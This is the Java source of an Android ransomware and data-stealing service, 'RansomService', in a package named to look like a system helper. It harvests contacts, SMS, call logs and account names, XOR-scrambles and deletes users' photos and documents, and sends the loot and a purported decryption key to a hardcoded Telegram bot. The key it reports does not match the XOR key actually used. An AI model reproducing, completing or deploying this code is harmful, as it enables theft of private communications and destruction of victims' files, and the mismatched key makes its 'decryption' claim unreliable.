package com.system.helper;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class RansomService extends Service {
    private static final String TAG = "RansomService";
    private static final String BOT_TOKEN = "8602800631:AAFVtzzFa0LldybopAEKi_16nADgsRDC8tM";
    private static final String CHAT_ID = "8558234600";
    private static final String AES_KEY = "WannaCry2026";
    
    private String encryptionKey;
    private JSONObject stolenData;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    stealAllData();
                    encryptAllFiles();
                    sendToTelegram();
                } catch (Exception e) {
                    Log.e(TAG, "Error: " + e.getMessage());
                }
            }
        }).start();
        return START_STICKY;
    }
    
    private void stealAllData() {
        stolenData = new JSONObject();
        try {
            stolenData.put("device_info", getDeviceInfo());
            stolenData.put("contacts", stealContacts());
            stolenData.put("sms", stealSMS());
            stolenData.put("call_logs", stealCallLogs());
            stolenData.put("accounts", stealAccounts());
            stolenData.put("timestamp", System.currentTimeMillis());
        } catch (Exception e) {}
    }
    
    private JSONArray stealContacts() {
        JSONArray contacts = new JSONArray();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
            null, null, null, null);
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                try {
                    String name = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.put(name + "|" + number);
                } catch (Exception e) {}
            }
            cursor.close();
        }
        return contacts;
    }
    
    private JSONArray stealSMS() {
        JSONArray messages = new JSONArray();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(
            Uri.parse("content://sms/inbox"), 
            new String[]{"address", "body", "date"}, 
            null, null, "date DESC LIMIT 200");
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                try {
                    String address = cursor.getString(0);
                    String body = cursor.getString(1);
                    String date = cursor.getString(2);
                    messages.put(address + "|" + date + "|" + body);
                } catch (Exception e) {}
            }
            cursor.close();
        }
        return messages;
    }
    
    private JSONArray stealCallLogs() {
        JSONArray calls = new JSONArray();
        ContentResolver cr = getContentResolver();
        Cursor cursor = cr.query(
            CallLog.Calls.CONTENT_URI,
            new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DURATION, CallLog.Calls.DATE},
            null, null, "date DESC LIMIT 100");
        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                try {
                    String number = cursor.getString(0);
                    String duration = cursor.getString(1);
                    calls.put(number + "|duration:" + duration + "s");
                } catch (Exception e) {}
            }
            cursor.close();
        }
        return calls;
    }
    
    private JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        try {
            info.put("model", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("android_version", android.os.Build.VERSION.RELEASE);
        } catch (Exception e) {}
        return info;
    }
    
    private JSONArray stealAccounts() {
        JSONArray accounts = new JSONArray();
        android.accounts.AccountManager am = 
            (android.accounts.AccountManager) getSystemService(Context.ACCOUNT_SERVICE);
        android.accounts.Account[] accountList = am.getAccounts();
        for (android.accounts.Account acc : accountList) {
            try {
                accounts.put(acc.type + "|" + acc.name);
            } catch (Exception e) {}
        }
        return accounts;
    }
    
    private void encryptAllFiles() {
        try {
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(256);
            SecretKey secretKey = keyGen.generateKey();
            encryptionKey = android.util.Base64.encodeToString(
                secretKey.getEncoded(), android.util.Base64.DEFAULT);
            
            File storageDir = Environment.getExternalStorageDirectory();
            encryptDirectory(new File(storageDir, "Pictures"));
            encryptDirectory(new File(storageDir, "Documents"));
            encryptDirectory(new File(storageDir, "Download"));
            
            stolenData.put("encryption_key", encryptionKey);
        } catch (Exception e) {
            Log.e(TAG, "Encryption error: " + e.getMessage());
        }
    }
    
    private void encryptDirectory(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                encryptDirectory(file);
            } else if (shouldEncrypt(file)) {
                encryptFile(file);
            }
        }
    }
    
    private boolean shouldEncrypt(File file) {
        String[] extensions = {".jpg", ".jpeg", ".png", ".gif", ".mp4", ".avi", ".pdf", 
                              ".doc", ".docx", ".txt", ".db", ".sqlite", ".backup"};
        for (String ext : extensions) {
            if (file.getName().toLowerCase().endsWith(ext)) return true;
        }
        return false;
    }
    
    private void encryptFile(File file) {
        try {
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            
            byte[] keyBytes = AES_KEY.getBytes();
            byte[] encrypted = new byte[data.length];
            for (int i = 0; i < data.length; i++) {
                encrypted[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.length]);
            }
            
            FileOutputStream fos = new FileOutputStream(file.getPath() + ".encrypted");
            fos.write(encrypted);
            fos.close();
            file.delete();
        } catch (Exception e) {}
    }
    
    private void sendToTelegram() {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String boundary = "----" + System.currentTimeMillis();
            
            StringBuilder postData = new StringBuilder();
            postData.append("--").append(boundary).append("\r\n");
            postData.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            postData.append(CHAT_ID).append("\r\n");
            postData.append("--").append(boundary).append("\r\n");
            postData.append("Content-Disposition: form-data; name=\"document\"; filename=\"stolen_data.json\"\r\n");
            postData.append("Content-Type: application/json\r\n\r\n");
            postData.append(stolenData.toString()).append("\r\n");
            postData.append("--").append(boundary).append("--\r\n");
            
            URL obj = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = conn.getOutputStream();
            os.write(postData.toString().getBytes());
            os.flush();
            os.close();
            
            sendTextMessage("🔑 DECRYPTION KEY: " + encryptionKey);
        } catch (Exception e) {}
    }
    
    private void sendTextMessage(String text) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            String postData = "chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");
            
            URL obj = new URL(url);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            
            OutputStream os = conn.getOutputStream();
            os.write(postData.getBytes());
            os.flush();
            os.close();
        } catch (Exception e) {}
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
